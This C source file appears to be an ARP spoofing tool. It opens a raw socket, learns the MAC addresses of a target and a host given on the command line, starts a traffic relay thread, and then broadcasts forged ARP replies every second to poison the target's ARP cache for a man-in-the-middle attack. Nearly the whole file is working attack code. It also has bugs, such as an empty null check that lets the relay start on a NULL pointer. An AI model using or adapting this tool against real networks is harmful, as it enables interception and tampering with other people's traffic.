#include "protocol.h"

#define TIME_SEC 1
enum {INDEX, HWADDR, ADDR};

struct thread_arg
{
    int sock;
    struct in_addr target_ip;
    struct in_addr host_ip;
};
struct arp_data
{
    uint8_t target_mac[6];
    uint8_t host_mac[6];
};

void *thread_recivarp(void *p);
void *thread_relay(void *p);
void INThandler(int sig);

int main(int argc, char **argv)
{
    int sock, len,result;
    struct sockaddr_ll sll;
    struct sockaddr_in *my_ip;
    struct ifreq ifr[3];
    uint8_t *buffer;
    uint8_t  my_mac[6];
    struct in_addr target_ip, host_ip;
    pthread_t thread_id;
    struct thread_arg thread_arg;
    struct arp_data *arp_data;
    
    if((sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL)))<0)
    {
        perror("socket ");
        return -1;
    }

    for(int i=0 ;i <3 ; i++)
    {
        memset(&ifr[i], 0x00, sizeof(struct ifreq));
        strcpy(ifr[i].ifr_name, IN_NAME);
    }

    if((ioctl(sock, SIOCGIFINDEX, &ifr[INDEX]))<0)
    {
        perror("ioctl index");
        return -1;
    }
    if((ioctl(sock, SIOCGIFHWADDR, &ifr[HWADDR]))<0)
    {
        perror("ioctl hwaddr");
        return -1;
    }
    if((ioctl(sock, SIOCGIFADDR, &ifr[ADDR]))<0)
    {
        perror("ioctl addr");
        return -1;
    }

    memcpy(my_mac, ifr[HWADDR].ifr_hwaddr.sa_data, 6);
    my_ip = (struct sockaddr_in *)&ifr[ADDR].ifr_addr;
    if(!inet_aton(argv[1],&target_ip))
    {
        printf("Target IP error\n");
        return -1;
    }
    if(!inet_aton(argv[2],&host_ip))
    {
         printf("Host IP error\n");
         return -1;
    }

    thread_arg.sock = sock;
    thread_arg.target_ip.s_addr = target_ip.s_addr;
    thread_arg.host_ip.s_addr = host_ip.s_addr;
    
    pthread_create(&thread_id, NULL, thread_recivarp, &thread_arg);

    memset(&sll, 0, sizeof(sll));
    sll.sll_ifindex = ifr[INDEX].ifr_ifindex;
    sll.sll_halen = ETH_ALEN; // length of destination mac address
    memset(sll.sll_addr, 0xFF, 6);

    buffer = make_arp_request_packet(my_mac, my_ip->sin_addr, target_ip);
    if((len = sendto(sock, buffer, ARPMAX,0,(struct sockaddr*)&sll,sizeof(sll)))<0)
        perror("sendto"); 
        
    buffer = make_arp_request_packet(my_mac, my_ip->sin_addr, host_ip);
    if((len = sendto(sock, buffer, ARPMAX,0,(struct sockaddr*)&sll,sizeof(sll)))<0)
        perror("sendto");  

    pthread_join(thread_id, (void **)&arp_data);
    
    if(arp_data == NULL)
    
    pthread_create(&thread_id, NULL, thread_relay, arp_data->host_mac);

    buffer = make_arp_reply_packet(my_mac ,host_ip ,arp_data->target_mac ,target_ip);

    printf("ARP Spoofing...\n");
    signal(SIGINT, INThandler);
    while(1)
    {
        if((len = sendto(sock, buffer, ARPMAX,0,(struct sockaddr*)&sll,sizeof(sll)))<0)
            perror("sendto");
        sleep(1);
    }

    free(arp_data);
    close(sock);
    return 0;
}

void *thread_recivarp(void *p)
{
    struct thread_arg *arg = (struct thread_arg *)p;
    int sock = arg->sock;
    uint8_t buffer[ARPMAX];
    struct etherhdr *etherhdr;
    struct arphdr *arphdr;
    struct in_addr target_ip = arg->target_ip;
    struct in_addr host_ip = arg->host_ip;
    struct arp_data *arp_data = (struct arp_data *)malloc(sizeof(struct arp_data));
    int t_fleg=0, h_fleg = 0;
    time_t start = time(NULL);
    time_t endtime = start + TIME_SEC;

    while(start < endtime)
    {
        if(read(sock, buffer, sizeof(buffer))<0)
            perror("read");
        etherhdr = (struct etherhdr *)buffer;
        arphdr = (struct arphdr*)(buffer+sizeof(struct etherhdr));
        
        if(etherhdr->ether_type == htons(0x0806))
        {
            if(arphdr->ar_op == htons(0x0002))
            {
                if(arphdr->ar_sip == target_ip.s_addr)
                {
                    memcpy(arp_data->target_mac,arphdr->ar_sha,6);
                    t_fleg = 1;
                }
                else if(arphdr->ar_sip == host_ip.s_addr)
                {
                    memcpy(arp_data->host_mac,arphdr->ar_sha,6);
                    h_fleg = 1;
                }
            }
        }
        if(t_fleg && h_fleg) return (void*)arp_data;
        start = time(NULL);
    }
    if(t_fleg && !h_fleg)
    {
        printf("<target_ip>is not up\n");
        return NULL;
    }
    else if(h_fleg && !t_fleg)
    {   
        printf("<host_ip> is not up\n");
        return NULL;
    }
    else if(!h_fleg && !t_fleg)
    {
        printf("All ip is not up\n");
        return NULL;
    }
}

void *thread_relay(void *p)
{
    uint8_t *mac = (uint8_t *)p;
    relay(mac);
}

void INThandler(int sig)
{
    int sock;
    uint8_t *buffer;

    signal(sig, SIG_IGN);

    exit(0); 
    
}